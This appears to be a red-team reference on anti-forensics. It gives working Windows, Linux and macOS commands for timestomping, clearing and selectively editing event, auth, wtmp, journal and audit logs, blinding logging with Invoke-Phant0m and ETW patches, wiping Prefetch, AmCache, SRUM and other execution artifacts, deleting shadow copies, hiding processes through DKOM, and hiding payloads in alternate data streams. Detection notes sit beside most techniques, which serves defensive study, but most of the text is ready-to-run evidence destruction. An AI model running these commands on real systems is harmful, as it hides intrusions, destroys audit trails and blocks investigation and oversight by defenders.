# Anti-Forensics Techniques

> **MITRE ATT&CK Mapping**: T1070 (Indicator Removal), T1070.001 (Clear Windows Event Logs), T1070.003 (Clear Command History), T1070.004 (File Deletion), T1070.006 (Timestomp), T1027.012 (LNK Icon Smuggling), T1070.009 (Clear Persistence)
> **Tactic**: Defense Evasion
> **Platforms**: Windows, Linux, macOS
> **Required Permissions**: Varies (User for history cleanup; Administrator/SYSTEM for event logs, MFT manipulation; root for journal/audit manipulation)
> **OPSEC Risk**: Medium (cleanup activity itself can generate detectable artifacts)

---

## Strategic Overview

Anti-forensics encompasses the techniques, tools, and methodologies used to impede forensic investigation and analysis. For red team operators, anti-forensics serves a dual purpose: maintaining operational security during an engagement by minimizing the forensic footprint, and testing an organization's ability to detect evidence tampering and recover from data destruction. The discipline requires deep understanding of how operating systems create, store, and manage forensic artifacts -- because only by understanding what artifacts exist can an operator effectively eliminate or manipulate them.

The fundamental challenge of anti-forensics is that nearly every action on a system creates multiple, often redundant, forensic traces. Executing a binary on Windows touches the Prefetch database, ShimCache, AmCache, SRUM, BAM/DAM, UserAssist, Jump Lists, and potentially dozens of other artifact sources. Deleting the binary removes it from the filesystem but leaves execution evidence across all these locations. Effective anti-forensics requires a systematic approach that addresses every artifact category, not just the obvious ones.

Modern forensic tools and techniques have evolved significantly, making many traditional anti-forensics approaches unreliable. $MFT analysis, $UsnJrnl examination, Volume Shadow Copy recovery, and memory forensics can often reconstruct activities even after extensive cleanup attempts. The 2025 landscape introduces new challenges with EDR telemetry being streamed to cloud-based SIEMs in real-time, making local log manipulation insufficient. Operators must understand both what can be cleaned locally and what has already been transmitted to centralized systems beyond their reach. The most effective anti-forensics strategy is to generate minimal artifacts in the first place, rather than attempting to clean up after the fact.

---

## Technical Deep-Dive

### 1. Timestamp Manipulation (Timestomping)

Timestomping is the modification of file timestamps to blend malicious files with legitimate system files or to disrupt timeline analysis. NTFS maintains timestamps in two attributes within the MFT: $STANDARD_INFORMATION ($SI) and $FILE_NAME ($FN).

#### Windows NTFS Timestamp Architecture

```
NTFS MFT Record Timestamps:

$STANDARD_INFORMATION ($SI) attribute:
  - Created (B-time)
  - Modified (M-time)
  - Accessed (A-time)
  - Entry Modified (C-time / MFT Modified)
  >> Modifiable from user-mode via SetFileTime API
  >> This is what timestomping tools modify

$FILE_NAME ($FN) attribute:
  - Created (B-time)
  - Modified (M-time)
  - Accessed (A-time)
  - Entry Modified (C-time)
  >> Only modifiable by the NTFS kernel driver
  >> Survives standard timestomping (key forensic indicator)
  >> Updated when file is moved/renamed across directories

Detection Rule:
  If $SI Created < $FN Created --> STRONG indicator of timestomping
  (A file cannot have a $SI creation time before its $FN creation time
   under normal operations)
```

#### Windows Timestomping Techniques

```powershell
# === PowerShell Native (SetFileTime) ===
# Modify Created, Modified, Accessed timestamps
$file = Get-Item C:\Windows\Temp\payload.exe
$file.CreationTime = "01/15/2023 08:30:00"
$file.LastWriteTime = "01/15/2023 08:30:00"
$file.LastAccessTime = "01/15/2023 08:30:00"

# Copy timestamps from a legitimate file
$legit = Get-Item C:\Windows\System32\notepad.exe
$target = Get-Item C:\Windows\Temp\payload.exe
$target.CreationTime = $legit.CreationTime
$target.LastWriteTime = $legit.LastWriteTime
$target.LastAccessTime = $legit.LastAccessTime

# === NtSetInformationFile (Lower-level, fewer logs) ===
# Using P/Invoke to call NtSetInformationFile directly
# This modifies $SI timestamps without some higher-level API hooks
Add-Type @"
using System;
using System.Runtime.InteropServices;
public class Timestomp {
    [DllImport("ntdll.dll", SetLastError = true)]
    public static extern int NtSetInformationFile(
        IntPtr FileHandle,
        ref IO_STATUS_BLOCK IoStatusBlock,
        ref FILE_BASIC_INFORMATION FileInformation,
        int Length,
        int FileInformationClass);

    [StructLayout(LayoutKind.Sequential)]
    public struct IO_STATUS_BLOCK {
        public IntPtr Status;
        public IntPtr Information;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct FILE_BASIC_INFORMATION {
        public long CreationTime;
        public long LastAccessTime;
        public long LastWriteTime;
        public long ChangeTime;
        public uint FileAttributes;
    }
}
"@

# === Metasploit Meterpreter ===
meterpreter> timestomp C:\\Windows\\Temp\\payload.exe -f C:\\Windows\\System32\\notepad.exe
# Copies all timestamps from notepad.exe to payload.exe

meterpreter> timestomp C:\\Windows\\Temp\\payload.exe -z "2023-01-15 08:30:00"
# Sets all four timestamps (MACE) to specified value

meterpreter> timestomp C:\\Windows\\Temp\\payload.exe -b
# Blank (zero) all timestamps -- very suspicious, use with caution
```

#### Modifying $FILE_NAME Timestamps (Advanced)

```
The $FN timestamp is only modifiable by the NTFS driver at the kernel level.
Known methods to influence $FN timestamps:

1. Move/rename across directories: Forces NTFS to update $FN timestamps
   - Create file with desired $SI timestamps
   - Move file to target directory
   - $FN timestamps may be updated to match $SI in some scenarios

2. Direct MFT manipulation (requires raw disk access):
   - Use tools like SetMACE (by jschicht) which modifies
     $FN timestamps through direct NTFS volume manipulation
   - Requires Administrator/SYSTEM privileges
   - Extremely risky -- can corrupt the filesystem

3. Volume Shadow Copy: $FN timestamps in VSS snapshots cannot be modified
   - Always delete shadow copies after timestomping (see Section 6)
```

#### Linux Timestamp Manipulation

```bash
# === touch command (modifies mtime and atime) ===
# Set specific timestamp
touch -t 202301150830.00 /tmp/payload

# Copy timestamps from another file
touch -r /usr/bin/ls /tmp/payload

# Modify only access time
touch -a -t 202301150830.00 /tmp/payload

# Modify only modification time
touch -m -t 202301150830.00 /tmp/payload

# === stat to verify timestamps ===
stat /tmp/payload

# === debugfs for ext4 (modify crtime/birth time) ===
# ext4 supports creation time (crtime), but standard tools cannot modify it
# debugfs can modify it with raw inode editing

# Find inode number
ls -i /tmp/payload
# Output: 1234567 /tmp/payload

# Use debugfs (DANGEROUS - unmounted filesystem only, or read-only mode)
sudo debugfs -w /dev/sda1
debugfs: set_inode_field <1234567> crtime 202301150830
debugfs: set_inode_field <1234567> ctime 202301150830

# === Change ctime (inode change time) ===
# ctime cannot be set directly -- it is updated by the kernel on metadata changes
# Workaround: change system clock, perform operation, restore clock
sudo date -s "2023-01-15 08:30:00"
chmod 644 /tmp/payload    # This updates ctime to current (spoofed) system time
sudo ntpdate pool.ntp.org  # Restore correct time
# WARNING: Changing system clock creates obvious forensic artifacts
```

#### Timestomping Detection Methods

```
1. $SI vs $FN comparison:
   - Tool: MFTECmd (Eric Zimmerman), analyzeMFT
   - If $SI.Created < $FN.Created --> timestomped
   - If $SI and $FN timestamps differ significantly --> suspicious

2. $UsnJrnl analysis:
   - Every file operation is logged in the USN Journal
   - Even if timestamps are modified, the USN Journal records the change
   - USN reason codes: USN_REASON_BASIC_INFO_CHANGE indicates timestamp modification
   - Tool: MFTECmd, NTFS Log Tracker

3. $LogFile analysis:
   - NTFS transaction log records metadata changes
   - Can recover original timestamps before modification
   - Tool: NTFS Log Tracker, LogFileParser

4. Prefetch timestamps:
   - Prefetch files record their own execution timestamps
   - Independent of file timestamps -- provides corroborating timeline

5. Event logs:
   - Sysmon Event ID 2 (FileCreateTime changed) specifically logs timestomping
   - Requires Sysmon to be installed and configured
```

---

### 2. Windows Event Log Manipulation

#### Clearing Entire Logs

```powershell
# === wevtutil (built-in Windows command) ===
wevtutil cl Security        # Clear Security log
wevtutil cl System           # Clear System log
wevtutil cl Application      # Clear Application log
wevtutil cl "Windows PowerShell"   # Clear PowerShell log

# Clear all logs at once
for /F "tokens=*" %i in ('wevtutil el') do wevtutil cl "%i"

# PowerShell equivalent
Get-WinEvent -ListLog * | ForEach-Object { wevtutil cl $_.LogName 2>$null }

# WARNING: Clearing the Security log generates Event ID 1102
# (The audit log was cleared) -- this is a high-fidelity detection signal
# The event includes the Subject (account) that performed the clearing

# === PowerShell Clear-EventLog ===
Clear-EventLog -LogName Security, System, Application
```

#### Selective Event Deletion with Invoke-Phant0m

```powershell
# Invoke-Phant0m kills EventLog service threads without stopping the service
# The service appears running but no events are recorded

# === How it works ===
# 1. Identifies the svchost.exe process hosting the EventLog service
# 2. Enumerates threads within that process
# 3. Identifies threads belonging to the EventLog service (wevtsvc.dll)
# 4. Terminates those specific threads using NtTerminateThread
# 5. The service status still shows "Running" but no events are logged

# Usage:
Import-Module .\Invoke-Phant0m.ps1
Invoke-Phant0m

# Verification: check that events are no longer being written
# Start malicious activity here...

# To restore logging: restart the EventLog service
net stop eventlog
net start eventlog

# === Detection ===
# - Sysmon Event ID 8 (CreateRemoteThread) or ID 10 (ProcessAccess)
#   targeting the EventLog service process
# - Time gaps in event logs (sudden absence of events)
# - EventLog service threads count dropping to zero
# - Process monitor tools showing thread termination in svchost.exe
```

#### DanderSpritz EventLogEdit Concept

```
DanderSpritz (NSA Equation Group toolkit, leaked by Shadow Brokers) included
EventLogEdit -- a tool for selective individual event removal from .evtx files.

Mechanism:
1. Does NOT delete the target event record from the .evtx file
2. Instead, modifies the record header of the PRECEDING event
3. Increases the preceding record's size to encompass the target record
4. The target record becomes "absorbed" into the preceding record
5. Event log viewers skip the hidden record during enumeration

Recovery:
- Fox-IT demonstrated that removed records can be recovered
- The original record data remains in the file (just unreferenced)
- Tool: danderspritz-evtx (Fox-IT) can detect and recover hidden records
- Signature: record size fields that don't match actual record content

Modern Alternative:
- Eventlogedit-evtx--Evolution (3gstudent GitHub)
  - Removes individual event records from .evtx files
  - More thorough than DanderSpritz approach
  - Rewrites the .evtx file structure
```

#### Direct .evtx File Manipulation

```powershell
# === Stop EventLog service to unlock .evtx files ===
# Method 1: Service stop (generates events, obvious)
net stop eventlog

# Method 2: Kill EventLog threads (Phant0m -- more subtle)
Invoke-Phant0m

# === Locate and manipulate .evtx files ===
# Default location: C:\Windows\System32\winevt\Logs\

# Copy log for offline editing
copy C:\Windows\System32\winevt\Logs\Security.evtx C:\Temp\Security.evtx

# Edit using EvtxECmd or custom tools to remove specific events
# Then replace the original file

# === Corrupt specific .evtx file to make it unreadable ===
# Overwrite the header of the .evtx file
# WARNING: Obvious tampering indicator
$bytes = [System.IO.File]::ReadAllBytes("C:\Windows\System32\winevt\Logs\Security.evtx")
$bytes[0] = 0x00   # Corrupt the ElfFile signature
[System.IO.File]::WriteAllBytes("C:\Windows\System32\winevt\Logs\Security.evtx", $bytes)

# === Delete specific .evtx files ===
# Requires EventLog service to be stopped first
del C:\Windows\System32\winevt\Logs\Microsoft-Windows-Sysmon%4Operational.evtx
del C:\Windows\System32\winevt\Logs\Microsoft-Windows-PowerShell%4Operational.evtx

# Restart service to recreate empty logs
net start eventlog
```

#### Event Tracing for Windows (ETW) Manipulation

```powershell
# ETW providers feed data to event logs and EDR tools
# Disabling ETW providers can blind both logging and EDR

# List active ETW sessions
logman query -ets

# Disable a specific ETW provider (e.g., Microsoft-Windows-Threat-Intelligence)
# This provider is used by many EDR products
# Requires patching EtwEventWrite in ntdll.dll:

# Conceptual patch (in-memory):
# 1. Get address of ntdll!EtwEventWrite
# 2. Overwrite first bytes with: xor eax, eax; ret (C3 31 C0)
# 3. All ETW events from the current process are silently dropped

# PowerShell Script Block Logging (provider)
# Disable via registry (persistent):
Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging" -Name "EnableScriptBlockLogging" -Value 0

# Disable via Group Policy:
# Computer Configuration > Admin Templates > Windows Components > Windows PowerShell
# Turn on PowerShell Script Block Logging: Disabled
```

---

### 3. Linux Log Manipulation

#### Standard Log Files

```bash
# === /var/log/auth.log (Debian/Ubuntu) or /var/log/secure (RHEL/CentOS) ===
# Remove specific entries (SSH logins, sudo commands)
sed -i '/attacker-ip/d' /var/log/auth.log
sed -i '/attacker-username/d' /var/log/auth.log

# Remove entries within a time range
sed -i '/Jan 15 08:3[0-9]/d' /var/log/auth.log

# === /var/log/syslog and /var/log/messages ===
sed -i '/suspicious-process/d' /var/log/syslog
sed -i '/reverse_shell/d' /var/log/messages

# === /var/log/apache2/ or /var/log/nginx/ (web server logs) ===
sed -i '/attacker-ip/d' /var/log/apache2/access.log
sed -i '/exploit\.php/d' /var/log/apache2/access.log

# === Safe editing approach (preserve file metadata) ===
# Copy, edit, and replace (maintains inode)
cp /var/log/auth.log /tmp/auth.bak
grep -v "attacker-ip" /tmp/auth.bak > /var/log/auth.log
rm /tmp/auth.bak

# Truncate log file (nuclear option -- obvious)
truncate -s 0 /var/log/auth.log
# Or: > /var/log/auth.log
# Or: cat /dev/null > /var/log/auth.log
```

#### wtmp/btmp/utmp Manipulation

```bash
# wtmp: successful login records (binary format)
# btmp: failed login records (binary format)
# utmp: currently logged-in users (binary format)

# === View current records ===
last -f /var/log/wtmp           # Login history
lastb -f /var/log/btmp          # Failed logins
who -a                           # Current sessions (utmp)

# === Editing binary login records ===
# Method 1: utmpdump (convert to text, edit, convert back)
utmpdump /var/log/wtmp > /tmp/wtmp.txt

# Edit /tmp/wtmp.txt -- remove attacker's login entries
# Each line represents a login record with fields:
# [type] [PID] [terminal] [username] [hostname] [IP] [time]
vi /tmp/wtmp.txt   # Delete lines containing attacker info

# Convert back to binary
utmpdump -r /tmp/wtmp.txt > /var/log/wtmp
rm /tmp/wtmp.txt

# Same process for btmp
utmpdump /var/log/btmp > /tmp/btmp.txt
# Edit and convert back
utmpdump -r /tmp/btmp.txt > /var/log/btmp

# Method 2: Custom binary editor
# Python script to selectively remove wtmp entries
python3 -c "
import struct
WTMP_RECORD_SIZE = 384  # Linux x86_64 utmp record size
records = []
with open('/var/log/wtmp', 'rb') as f:
    while True:
        record = f.read(WTMP_RECORD_SIZE)
        if not record or len(record) < WTMP_RECORD_SIZE:
            break
        # Check if record contains attacker's username or IP
        if b'attacker' not in record and b'10.10.10' not in record:
            records.append(record)
with open('/var/log/wtmp', 'wb') as f:
    for record in records:
        f.write(record)
"
```

#### systemd Journal Manipulation

```bash
# === journalctl cleanup ===
# Vacuum by time (remove entries older than specified)
sudo journalctl --vacuum-time=1d    # Keep only last day

# Vacuum by size
sudo journalctl --vacuum-size=50M   # Limit to 50MB

# Rotate and vacuum (force rotation then clean)
sudo journalctl --rotate
sudo journalctl --vacuum-time=1s    # Remove all rotated journals

# === Direct journal file manipulation ===
# Journal files location: /var/log/journal/<machine-id>/
# or /run/log/journal/<machine-id>/ (volatile)

# Delete specific journal files
sudo rm /var/log/journal/*/system@*.journal
sudo rm /var/log/journal/*/user-*.journal

# Corrupt journal to make it unreadable
sudo dd if=/dev/urandom of=/var/log/journal/*/system.journal bs=1 count=100 conv=notrunc

# After manipulation, restart journald
sudo systemctl restart systemd-journald

# === Disable persistent journaling ===
# Edit /etc/systemd/journald.conf:
# Storage=volatile    (store in RAM only, lost on reboot)
# or
# Storage=none        (disable entirely)
sudo systemctl restart systemd-journald
```

#### auditd Log Manipulation

```bash
# auditd logs: /var/log/audit/audit.log

# === Stop auditd temporarily ===
sudo systemctl stop auditd
# Or kill the process (auditd is designed to resist stopping)
sudo kill -9 $(pidof auditd)

# === Disable audit rules ===
sudo auditctl -D          # Delete all rules
sudo auditctl -e 0        # Disable auditing (if -e 2 is not set)
# Note: auditctl -e 2 makes audit configuration immutable until reboot

# === Edit audit logs ===
sed -i '/attacker-ip/d' /var/log/audit/audit.log
sed -i '/suspicious_binary/d' /var/log/audit/audit.log

# === Truncate audit log ===
sudo truncate -s 0 /var/log/audit/audit.log

# === Modify audit configuration to exclude attacker's activity ===
# Add exclusion rule for attacker's UID
sudo auditctl -a always,exclude -F uid=1337

# Exclude specific syscalls
sudo auditctl -a always,exclude -F arch=b64 -S connect
```

---

### 4. Windows Artifact Cleanup

#### Prefetch Files

```powershell
# Prefetch files: C:\Windows\Prefetch\*.pf
# Created when a program runs for the first time
# Contains: executable name, run count, timestamps, loaded DLLs/files

# === Delete specific prefetch files ===
del C:\Windows\Prefetch\MIMIKATZ.EXE-*.pf
del C:\Windows\Prefetch\CHISEL.EXE-*.pf
del C:\Windows\Prefetch\RUBEUS.EXE-*.pf
del C:\Windows\Prefetch\SHARPHOUND.EXE-*.pf

# Delete all prefetch (nuclear option -- very suspicious)
del C:\Windows\Prefetch\*.pf

# === Disable Prefetch entirely ===
# Registry: HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management\PrefetchParameters
# EnablePrefetcher: 0 (disabled), 1 (app only), 2 (boot only), 3 (both)
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management\PrefetchParameters" -Name "EnablePrefetcher" -Value 0

# NOTE: Prefetch file naming convention: EXECUTABLE.EXE-XXXXXXXX.pf
# The hash (XXXXXXXX) is based on the executable path
# Different paths for the same executable create different prefetch files
```

#### ShimCache (AppCompatCache)

```powershell
# ShimCache location:
# HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\AppCompatCache\AppCompatCache
# Contains: file path, file size, last modified time, execution flag

# CRITICAL: ShimCache is only written to the registry on system SHUTDOWN
# During runtime, entries are stored in kernel memory
# This means:
# 1. Entries from the current session are NOT yet in the registry
# 2. Restarting the EventLog service does NOT persist ShimCache
# 3. Deleting the registry key before reboot prevents current session entries from persisting

# === Clear ShimCache registry entry (prevents persistence of current session) ===
# Must be done BEFORE the system reboots/shuts down
reg delete "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\AppCompatCache" /v AppCompatCache /f

# === Volatile vs Persisted entries ===
# Volatile (in-memory, current session): Cannot be easily cleaned without kernel access
# Persisted (registry, from last shutdown): Can be deleted from registry
# Analysis tool: AppCompatCacheParser (Eric Zimmerman), ShimCacheParser
```

#### AmCache

```powershell
# AmCache location: C:\Windows\appcompat\Programs\Amcache.hve
# Contains: SHA1 hash, file path, file size, publisher, PE header info
# Stored in registry hive format

# === Entries to clean ===
# InventoryApplicationFile: records of executed files with hashes
# InventoryDriverBinary: driver execution records
# InventoryDevicePnp: PnP device records

# === Offline editing with Registry Explorer ===
# 1. Copy Amcache.hve (requires stopping the Application Experience service)
net stop "Application Experience"
copy C:\Windows\appcompat\Programs\Amcache.hve C:\Temp\Amcache.hve

# 2. Load in Registry Explorer, navigate to:
#    Root\InventoryApplicationFile\
#    Find and delete entries for malicious tools

# 3. Replace the original
copy C:\Temp\Amcache.hve C:\Windows\appcompat\Programs\Amcache.hve
net start "Application Experience"

# === Delete entire AmCache ===
net stop "Application Experience"
del C:\Windows\appcompat\Programs\Amcache.hve
net start "Application Experience"
# A new empty Amcache.hve will be created

# === Note on AmCache persistence ===
# Unlike ShimCache, AmCache writes entries relatively quickly after execution
# Entries persist even after the file is deleted from disk
# SHA1 hashes in AmCache can link to known malicious tool signatures
```

#### SRUM Database

```powershell
# SRUM (System Resource Usage Monitor): C:\Windows\System32\sru\SRUDB.dat
# Contains: per-application network usage, CPU time, battery drain, memory usage
# Records application execution with network byte counts (sent/received)
# Retention: up to 30-60 days of data

# === Stop SRUM service ===
net stop DPS   # Diagnostic Policy Service (manages SRUM)

# === Delete SRUM database ===
del C:\Windows\System32\sru\SRUDB.dat

# === Restart service (creates new empty database) ===
net start DPS

# CRITICAL: SRUM data can reveal:
# - Network activity of C2 tools (bytes sent/received per app)
# - Execution of tools that generated network traffic
# - Timeline of application usage with network metrics
# Analysis tool: SrumECmd (Eric Zimmerman), srum-dump
```

#### BAM/DAM (Background/Desktop Activity Monitor)

```powershell
# BAM: HKLM\SYSTEM\CurrentControlSet\Services\bam\State\UserSettings\<SID>
# DAM: HKLM\SYSTEM\CurrentControlSet\Services\dam\State\UserSettings\<SID>
# Present in Windows 10 1709+ and Windows 11
# Contains: full path of executed programs with last execution timestamp

# === View BAM entries ===
Get-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Services\bam\State\UserSettings\*"

# === Delete specific BAM entries ===
$sid = (Get-WmiObject Win32_UserAccount | Where-Object { $_.Name -eq $env:USERNAME }).SID
$path = "HKLM:\SYSTEM\CurrentControlSet\Services\bam\State\UserSettings\$sid"

# Remove specific executable entry
Remove-ItemProperty -Path $path -Name "\Device\HarddiskVolume3\Users\user\Desktop\mimikatz.exe"

# === Delete all BAM entries for current user ===
Remove-Item -Path $path -Recurse
```

#### Recent Items, Jump Lists, and UserAssist

```powershell
# === Recent Items ===
# Location: %APPDATA%\Microsoft\Windows\Recent\
del "$env:APPDATA\Microsoft\Windows\Recent\*.lnk"
del "$env:APPDATA\Microsoft\Windows\Recent\AutomaticDestinations\*"
del "$env:APPDATA\Microsoft\Windows\Recent\CustomDestinations\*"

# === Jump Lists ===
# AutomaticDestinations: %APPDATA%\Microsoft\Windows\Recent\AutomaticDestinations\
# CustomDestinations: %APPDATA%\Microsoft\Windows\Recent\CustomDestinations\
# Files named by AppID hash (e.g., 5f7b5f1e01b83767.automaticDestinations-ms)
# Contains: recently accessed files per application

# Delete all Jump Lists
del "$env:APPDATA\Microsoft\Windows\Recent\AutomaticDestinations\*"
del "$env:APPDATA\Microsoft\Windows\Recent\CustomDestinations\*"

# === UserAssist ===
# Location: NTUSER.DAT\Software\Microsoft\Windows\CurrentVersion\Explorer\UserAssist
# Values are ROT13 encoded (simple letter substitution cipher)
# Contains: program execution count and last run time

# Decode ROT13 to find entries
$key = Get-ItemProperty "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\UserAssist\{CEBFF5CD-ACE2-4F4F-9178-9926F41749EA}\Count"

# Delete specific UserAssist entries (ROT13 encode the path first)
# Example: "C:\Tools\mimikatz.exe" -> ROT13 -> "P:\Gbbyf\zvzvxngm.rkr"
Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\UserAssist\{CEBFF5CD-ACE2-4F4F-9178-9926F41749EA}\Count" -Name "P:\Gbbyf\zvzvxngm.rkr"

# Delete all UserAssist entries
Remove-Item "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\UserAssist\*" -Recurse

# === MUI Cache ===
# HKCU\Software\Classes\Local Settings\Software\Microsoft\Windows\Shell\MuiCache
# Contains: program paths and their friendly names
Remove-Item "HKCU:\Software\Classes\Local Settings\Software\Microsoft\Windows\Shell\MuiCache" -Recurse

# === Shellbags ===
# Track folder access (including network paths and deleted folders)
# NTUSER.DAT: Software\Microsoft\Windows\Shell\BagMRU
# USRCLASS.DAT: Local Settings\Software\Microsoft\Windows\Shell\BagMRU
# Analysis tool: ShellBagsExplorer (Eric Zimmerman)
Remove-Item "HKCU:\Software\Microsoft\Windows\Shell\BagMRU" -Recurse
Remove-Item "HKCU:\Software\Microsoft\Windows\Shell\Bags" -Recurse
```

#### LNK Files

```powershell
# LNK (shortcut) files are created automatically when files are opened
# Location: %APPDATA%\Microsoft\Windows\Recent\
# Contains: target path, MAC timestamps, volume serial, drive type,
#           NetBIOS name, MAC address (if network resource)

# Delete specific LNK files
del "$env:APPDATA\Microsoft\Windows\Recent\mimikatz*"
del "$env:APPDATA\Microsoft\Windows\Recent\*.lnk"

# LNK files on the Desktop or in other locations may also exist
Get-ChildItem -Path C:\Users -Recurse -Filter "*.lnk" -ErrorAction SilentlyContinue |
    Where-Object { $_.Name -match "mimikatz|rubeus|chisel|payload" } |
    Remove-Item -Force
```

---

### 5. Memory Forensics Evasion

#### Sleep Obfuscation (Ekko)

```
Ekko is a sleep obfuscation technique that encrypts the implant's memory
during sleep periods, preventing memory scanners from detecting the payload.

Mechanism:
1. Creates a timer queue with sequenced callbacks
2. Callback 1: NtProtectVirtualMemory - changes memory to RW (removes executable)
3. Callback 2: SystemFunction032 - encrypts the payload memory with RC4
4. Callback 3: WaitForSingleObject - sleeps for the specified duration
5. Callback 4: SystemFunction032 - decrypts the payload memory
6. Callback 5: NtProtectVirtualMemory - restores RX permissions
7. Callback 6: NtSetEvent - signals completion

Key Points:
- Payload is encrypted while sleeping (most of its lifecycle)
- Memory scanners see only encrypted/random data during sleep
- Timer queue callbacks execute in a separate thread
- ROP chain is used to avoid suspicious API call patterns

Detection:
- Timer queue objects with suspicious callback patterns
- RWX -> RW memory permission changes followed by encryption
- WithSecure: Hunt for timer-queue timers with specific patterns
- Periodic memory permission changes (RW <-> RX transitions)
```

#### Sleep Obfuscation (Foliage)

```
Foliage extends sleep obfuscation using Asynchronous Procedure Calls (APCs).

Mechanism:
1. Queues a series of user-mode APCs to the current thread
2. APCs execute sequentially when the thread enters an alertable wait state
3. APC 1: VirtualProtect - change to RW
4. APC 2: SystemFunction032 - encrypt payload
5. APC 3: WaitForSingleObjectEx - sleep (alertable)
6. APC 4: SystemFunction032 - decrypt payload
7. APC 5: VirtualProtect - restore RX
8. Thread resumes execution after APC chain completes

Advantages over Ekko:
- Uses APCs instead of timer queues (different detection surface)
- Can work with the current thread context
- More natural execution flow
- Harder to distinguish from legitimate APC usage

Detection:
- Unusual APC queue patterns
- Repeated VirtualProtect calls alternating RW/RX on the same region
- SystemFunction032 (RC4) calls from unexpected contexts
```

#### Advanced Sleep Obfuscation Variants (2025)

```
Cronos: Uses waitable timers instead of timer queues
  - Creates a waitable timer object
  - Sets the timer with a DPC callback
  - Callback encrypts, sleeps, and decrypts
  - Different artifact surface than Ekko

Hypnus: Memory obfuscation implemented in Rust
  - Leverages Rust's safety guarantees for reliable operation
  - Supports multiple encryption algorithms
  - Cross-platform potential

ThreadlessInject + Sleep Obfuscation:
  - Combines threadless injection with sleep encryption
  - No new thread creation (avoids Sysmon Event ID 8)
  - Payload is injected into existing thread's execution flow
  - Encrypted during idle periods
```

#### DKOM (Direct Kernel Object Manipulation)

```
DKOM involves directly modifying kernel data structures to hide processes,
drivers, or other objects from system enumeration APIs.

Process Hiding (EPROCESS unlinking):
1. Every process has an EPROCESS structure in kernel memory
2. EPROCESS structures are linked via ActiveProcessLinks (doubly-linked list)
3. APIs like NtQuerySystemInformation enumerate this list
4. Unlinking a process from the list hides it from Task Manager, Process Explorer, etc.

// Conceptual pseudocode for EPROCESS unlinking:
PEPROCESS targetProcess;
PsLookupProcessByProcessId(targetPID, &targetProcess);
PLIST_ENTRY listEntry = (PLIST_ENTRY)((ULONG_PTR)targetProcess + ActiveProcessLinksOffset);
listEntry->Blink->Flink = listEntry->Flink;
listEntry->Flink->Blink = listEntry->Blink;
// Process is now hidden from enumeration

Detection:
- Cross-reference process list with other kernel structures:
  - PspCidTable (handle table)
  - Thread scheduler lists (KTHREAD)
  - Object directory
  - CSR process list (csrss.exe)
- Pool tag scanning: find EPROCESS structures via pool tags (Proc)
- Volatility: psxview plugin compares multiple process listing methods
```

#### VAD (Virtual Address Descriptor) Manipulation

```
VADs describe memory regions in a process's address space.
Manipulating VADs can hide injected code from memory forensic tools.

Technique:
1. Allocate memory for payload (creates a VAD entry)
2. After injection, modify the VAD to:
   - Change protection flags (hide RWX from queries)
   - Unlink the VAD from the AVL tree
   - Modify the VAD type to appear as a mapped file
3. Memory forensic tools that rely on VAD enumeration will miss the region

Detection:
- Compare VAD tree with actual page table entries (PTEs)
- Gaps in virtual address space that have valid PTEs but no VAD
- Volatility: vadinfo, vadtree, vadwalk plugins
- PTEscan to find executable pages not covered by VADs
```

---

### 6. Disk Forensics Evasion

#### Volume Shadow Copy Deletion

```powershell
# === vssadmin (most common) ===
vssadmin delete shadows /all /quiet

# Delete shadows for specific volume
vssadmin delete shadows /for=C: /quiet

# === wmic (alternative method) ===
wmic shadowcopy delete

# Delete specific shadow by ID
wmic shadowcopy where "ID='{GUID}'" delete

# === PowerShell WMI ===
Get-WmiObject Win32_ShadowCopy | ForEach-Object { $_.Delete() }

# === diskshadow (often overlooked by defenders) ===
# Create a script file:
# delete shadows all
# Then execute:
diskshadow /s script.txt

# Or inline:
diskshadow
DISKSHADOW> delete shadows all

# === COM-based deletion (DeviceIoControl) ===
# Uses direct IOCTL calls to the Volume Shadow Copy service
# Avoids command-line logging of vssadmin/wmic
# Picus Security documented this as an underrated technique

# === Resize instead of delete (subtler) ===
vssadmin resize shadowstorage /for=C: /on=C: /maxsize=401MB
# Shrinking the storage forces old shadows to be deleted

# === Detection ===
# Event ID 7036: VSS service state change
# Event ID 524: Shadow copy was deleted (System log)
# Command-line logging of vssadmin, wmic, diskshadow
# MITRE CAR-2021-01-009: Shadow Copy Deletion or Resize
```

#### $MFT Record Manipulation

```
The Master File Table ($MFT) is the central metadata structure of NTFS.
Every file and directory has at least one MFT record.

Manipulation Techniques:
1. Zeroing MFT records: Overwrite the MFT entry for a deleted file with zeros
   - Prevents MFT carving from recovering file metadata
   - Requires raw disk access (admin + volume lock or offline)

2. Modifying $STANDARD_INFORMATION: Change timestamps (see Section 1)

3. Modifying file size records: Alter the recorded file size
   - Can mislead investigators about the actual content

4. Slack space utilization:
   - NTFS allocates in clusters (typically 4KB)
   - A 1KB file uses 4KB on disk; the remaining 3KB is slack space
   - Data can be hidden in slack space
   - Tools: slacker, bmap

Raw MFT Access (PowerShell):
# Read raw MFT (requires admin)
$volume = "\\.\C:"
$handle = [System.IO.File]::Open($volume, [System.IO.FileMode]::Open, [System.IO.FileAccess]::Read, [System.IO.FileShare]::ReadWrite)
# MFT is typically at cluster 786432 (varies per volume)
```

#### Alternate Data Streams (ADS)

```powershell
# NTFS ADS allows data to be stored in named streams attached to files
# Hidden from standard directory listings

# === Create ADS ===
# Attach data to an existing file
echo "hidden payload data" > C:\Windows\Temp\legit.txt:hidden
type C:\Windows\Temp\payload.exe > C:\Windows\Temp\legit.txt:payload.exe

# === PowerShell ADS creation ===
Set-Content -Path "C:\Windows\Temp\legit.txt:hidden" -Value "secret data"
Add-Content -Path "C:\Windows\Temp\legit.txt:config" -Value (Get-Content C:\path\to\payload.exe -Raw)

# === Execute from ADS ===
wmic process call create "C:\Windows\Temp\legit.txt:payload.exe"
# Note: Direct execution from ADS is restricted in newer Windows versions

# === View ADS ===
dir /R C:\Windows\Temp\legit.txt
Get-Item C:\Windows\Temp\legit.txt -Stream *

# === Remove ADS ===
Remove-Item C:\Windows\Temp\legit.txt -Stream hidden
